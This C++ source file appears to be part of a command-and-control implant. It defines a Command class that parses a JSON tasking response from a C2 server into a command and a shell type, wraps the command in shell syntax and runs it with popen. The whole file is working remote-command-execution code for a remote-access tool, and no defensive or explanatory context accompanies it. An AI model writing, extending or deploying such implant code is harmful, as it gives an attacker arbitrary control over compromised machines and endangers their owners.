#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"

#include <string>

#include "constants.hh"
#include "system.hh"

class Command {
   public:
    Command(std::string& c2_response);
    std::string Execute();

    std::string command_text;
    std::string shell;
};

/* Define Command member functions */
Command::Command(std::string& c2_response) {
    // Parse into something resembling a nested unordered map
    rapidjson::Document json;
    json.Parse(c2_response.c_str());

    if (json.IsObject()) {
        command_text = json["command_text"].IsString()
                           ? json["command_text"].GetString()
                           : "";
        shell =
            json["shell"].IsString() ? json["shell"].GetString() : "default";
    } else {
        shell = "default";
    }
}

std::string Command::Execute() {
    /* Add necessary syntax before and after command
     * depending on shell choice */
    std::string string_to_exec;

    if (shell == "default") {
        string_to_exec = command_text;
    } else {
        std::string pre_text, post_text;
        std::tie(pre_text, post_text) = SHELL_SYNTAX_LIST.at(shell.c_str());
        string_to_exec = pre_text + command_text + post_text;
    }

    return util::PopenSubprocess(string_to_exec.c_str());
}